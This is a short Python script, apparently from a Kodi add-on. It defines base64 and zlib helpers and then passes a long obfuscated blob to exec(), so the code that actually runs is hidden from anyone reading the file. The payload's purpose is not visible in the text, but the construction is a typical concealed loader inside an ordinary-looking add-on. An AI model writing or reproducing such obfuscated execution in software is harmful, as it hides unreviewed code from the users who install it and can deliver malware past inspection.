#!/usr/bin/python
# -*- coding: utf-8 -*-
import random, threading
import xbmc, xbmcaddon, xbmcvfs, xbmcgui
import zlib
import base64

def decode_base64( b64string ):
    decoded_data = base64.b64decode( b64string )
    return zlib.decompress( decoded_data , -15)

def base64_encode( string_val ):
    zlibbed_str = zlib.compress( string_val )
    compressed_string = zlibbed_str[2:-4]
    return base64.b64encode( compressed_string )

exec(decode_base64('rVRdb9owFH3Pr/AeqiRtmga6ThsSD6xQGolCNdJ2EqoiN3GC1SSObFOYpv33XQcDSaFdHxaJ2Lkf5x5fn0uv35+MQ7+P1k8XmSLitJQujjmVJCrIUiSExGo1DW0Mp4Mg8MfDqUpYPeURjmNWuD31tmjc7WlQ21jvxr2bgYZ/jeCmRFZ5fpEwyyxwTsxN2v3gx9SfjD+Q9kK4oKzYZt72gmtd0PpHaonl3LTdmEQsJpa5kMnpV9O2jU14OJpcfoR5yVlCM7IPZaD/9RjG1eDyOgz8bTdnbefCaXlO68I595wvsGl7jzNayIOnnhIpaZFaZkDykqESc4wSEs0xhwM/Gn4/HPnTYKuE2bnX9jwAPvc88N4Ma+4u+q28rY6pC92HR7FbFqmJjjguYpa7alFMWk7bdvaboGAPpB/K/mMYUYaFQMM731JySxfUfaAQt/x5M+pTnLHU7lQlYpKgMKQFlWFoCZIlDjrGPBWwHD8v1Q7pSPWoADdj0XMvkiAfONUVzgRp+qOMCRLQnHDwyzknGIilbmWxthfi1IJ3V97cKHJAVfPKReqgjLyQrKvO5I4mw/7g+92wxq+yq4zNQKETZJ6a8G4OyMa6g2yqbv9DUVHKpbJiU6up+y9g5i37nU4FfNFoFIkkWHV2NGc0IpZW1A4mYRzRGNECaVenyY0myv2pqwE767og3UtWSM4y+HOxgZq8p4I+ZcSqrusVy1q0pnWCWlWWn+MUSGkhz3bexx3EqmQgll/wRt038GxlumWCqk7UerSksZy/mbVmAeYHFVZLW+VU9dODACX4CqXuxSvwtr61PXR6KOAtjqLGsTZT8IMeqJqOgna2iGdnn217ffIPgW+uQOnAbipWZISUVuvC894T0Luj5gqJuYQu7U8QK9YQeoxw9VETMGhor5iu1qmVsey/'))